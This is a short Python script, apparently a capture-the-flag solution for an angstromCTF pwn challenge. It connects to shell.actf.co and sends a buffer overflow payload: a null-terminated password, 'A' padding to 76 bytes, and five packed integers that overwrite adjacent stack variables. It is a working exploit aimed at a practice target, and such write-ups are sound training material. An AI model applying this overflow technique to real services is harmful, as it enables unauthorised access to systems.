import socket
import struct
import time


def flush(sock):
    time.sleep(0.1)
    return sock.recv(2048)


def p32(n):
    return struct.pack("<I", n)


def p64(n):
    return struct.pack("<Q", n)


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("shell.actf.co", 21303))

    print(flush(sock).decode())
    
    password = b"password123\x00"

    payload = password + (b"A" * (76 - len(password)))
    payload += p32(17)      # when_i_learned_the_truth
    payload += p32(61)      # which_highway_to_take_my_telephones_to
    payload += p32(245)     # when_im_walking_out_on_center_circle
    payload += p32(55)      # what_i_cant_drive
    payload += p32(50)      # way_to_leave_your_lover
    payload += b"\n"

    sock.send(payload)

    print(flush(sock).decode())
